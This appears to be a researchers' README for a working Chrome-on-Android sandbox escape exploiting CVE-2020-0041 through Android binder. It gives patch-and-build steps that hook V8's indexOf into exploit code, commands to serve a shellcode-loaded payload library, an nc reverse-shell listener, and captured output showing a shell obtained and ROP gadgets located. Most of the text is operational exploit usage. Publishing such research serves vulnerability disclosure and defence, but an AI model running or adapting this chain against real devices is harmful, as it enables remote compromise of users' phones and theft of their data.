# CVE-2020-0041: Chrome sandbox escape exploit

This folder contains the Chrome sandbox escape exploit we wrote for CVE-2020-0041. 
The exploit is provided as a set of patches for Chromium 78.0.3904.62 in order to 
demonstrate the approach.

The same code could be simply injected into the renderer from an RCE vulnerability 
or using a rooted phone for test pruposes.   

## Testing the exploit


### Building chrome

The exploit is provided as a set of patches for a checkout of the `78.0.3904.62`
release branch.

To test the exploit, first checkout and build the provided branch for Android. 
The exploit was built against a build using the following arguments:

```
target_os = "android"
target_cpu = "arm"
is_debug = false
is_official_build=true
```

After the initial build succeeds, apply the changes in `sandbox/v8.diff` to the 
`v8` code, and the changes in `main.diff` to the main repository:

```
user@laptop:~/work/chromium_release/chromium/src$ patch -p1 < ~/num_valid/sandbox/main.diff 
patching file content/renderer/binder.c
patching file content/renderer/binder.h
patching file content/renderer/binder_lookup.h
patching file content/renderer/constants.h
patching file content/renderer/exploit.c
patching file content/renderer/render_thread_impl.cc
patching file content/renderer/rop.h
patching file content/renderer/sc.h
patching file content/renderer/uapi_binder.h

user@laptop:~/chromium/src$ cd v8
user@laptop:~/chromium/src/v8$ patch -p1 < ~/num_valid/sandbox/v8.diff 
patching file src/builtins/builtins-typed-array.cc
```

The patches create a hook in the `indexOf` function of typed array buffers, 
which when called with 3 or more arguments redirect execution into the `exploit`
function in `content/renderer/exploit.c`.

After the patches have been applied, rebuild Chromium and install the produced
APK.

```
user@laptop:~/work/chromium_release/chromium/src$ ninja -C out/Default chrome_public_apk -j 8 && \
out/Default/bin/chrome_public_apk uninstall && out/Default/bin/chrome_public_apk install
```

### Testing the exploit

After building the patched chromium and installing it on a phone, the following 
setup is required:

1. Build the library you would like to  payload and run the `serve.py` script from the `sandbox/` folder.
This script will provide the `payload.so` file to be loaded by the shellcode. Additionally, 
it also serves the `payload.dex` and `payload.exe` file if the `payload.so` file requests 
them (used for the LPE exploit):

	```
  $ cd reverse_shell && make && cp libs/armeabi-v7a/libpayload.so ../payload.so && cd ..
	$ adb reverse tcp:6666 tcp:6666 ; python ./serve.py
	```

2. Setup a reverse shell listener on tcp:5555:

	```
	$ adb reverse tcp:5555 tcp:5555 ; nc -l -p 5555 -vv
	```

3. Serve `sandbox/index.html` to the browser to trigger the exploit. For example,
using python:

	```
	$ adb reverse tcp:8080 tcp:8080 ; python -m SimpleHTTPServer 8080
	```

Now simply navigate to http://localhost:8080/ to trigger the exploit.

```
$ adb reverse tcp:5555 tcp:5555 ; nc -l -p 5555 -vv
5555
Listening on [0.0.0.0] (family 0, port 5555)
Connection from localhost 36871 received!
id
uid=10246(u0_a246) gid=10246(u0_a246) groups=10246(u0_a246),3001(net_bt_admin),3002(net_bt),3003(inet),9997(everybody),20246(u0_a246_cache),50246(all_a246) context=u:r:untrusted_app_27:s0:c246,c256,c512,c768

```

The exploit also produces debug output in logcat with the PWN tag. To see it, 
simply run `adb logcat | grep PWN`. It should produce output similar to this:

```
11-04 16:33:08.269 31606 31634 D PWN     : [*] Binder mapping at 0xc97eb000
11-04 16:33:08.269 31606 31634 D PWN     : [*] Found binder fd 9
11-04 16:33:08.272 31606 31634 D PWN     : [*] IParentProcess handle is 5
11-04 16:33:08.275 31606 31634 D PWN     : [*] Transaction size max fdeb8
11-04 16:33:08.275 31606 31634 D PWN     : [*] Target user_address: c97eb148
11-04 16:33:08.276 31606 31634 D PWN     : [*] Target binder offset: 64
11-04 16:33:08.276 31606 31634 D PWN     : [*] Fake PTR offset: 7c
11-04 16:33:08.276 31606 31634 D PWN     : [*] Valid PTR offset: a4
11-04 16:33:08.276 31606 31634 D PWN     : [*] Shellcode size: 0x160
11-04 16:33:08.286 31606 31634 D PWN     : [*] libc: 0xf1585000 , libc size: 0xb6000
11-04 16:33:08.289 31606 31634 D PWN     : [*] Found gadget 0 at 0xf163024c
11-04 16:33:08.290 31606 31634 D PWN     : [*] Found gadget 1 at 0xf15dfcdc
11-04 16:33:08.291 31606 31634 D PWN     : [*] Found gadget 2 at 0xf15ce0a9
11-04 16:33:08.292 31606 31634 D PWN     : [*] Found gadget 3 at 0xf15e8c6f
11-04 16:33:08.293 31606 31634 D PWN     : [*] Found gadget 4 at 0xf15ee10d
11-04 16:33:08.293 31606 31634 D PWN     : [*] Found gadget 5 at 0xf15ae24d
11-04 16:33:08.295 31606 31634 D PWN     : [*] Found gadget 6 at 0xf160ebfc
11-04 16:33:08.297 31606 31634 D PWN     : [*] Found gadget 7 at 0xf1619335
11-04 16:33:08.297 31606 31634 D PWN     : [*] Found gadget 8 at 0xf15d38df
11-04 16:33:08.298 31606 31634 D PWN     : [*] Found gadget 9 at 0xf15bb2b8
11-04 16:33:08.299 31606 31634 D PWN     : [*] Found gadget 10 at 0xf15e4774
11-04 16:33:08.300 31606 31634 D PWN     : [*] Found gadget 11 at 0xf15dfbb8
11-04 16:33:08.302 31606 31634 D PWN     : [*] Handle: 0xec965cd8, open: 0xf15eb281
11-04 16:33:08.311 31606 31634 D PWN     : [*] Linker mapping at 0xf39d6000, size b9000
11-04 16:33:08.311 31606 31634 D PWN     : [*] Found linker dlopen: 0xf39f30b9
11-04 16:33:08.311 31606 31634 D PWN     : [*] fake_object_addr: c97eb2e8
11-04 16:33:08.311 31606 31634 D PWN     : [*] Register scratch space: f163b6e8
11-04 16:33:08.311 31606 31634 D PWN     : [*] Final shellcode expected at c97eb658
11-04 16:33:08.311 31606 31634 D PWN     : [*] Final shellcode location 30309000
11-04 16:33:08.311 31606 31634 D PWN     : [*] Shellcode copy at 30308800
11-04 16:33:08.337 31606 31634 D PWN     : [*] transaction return code: 0

```
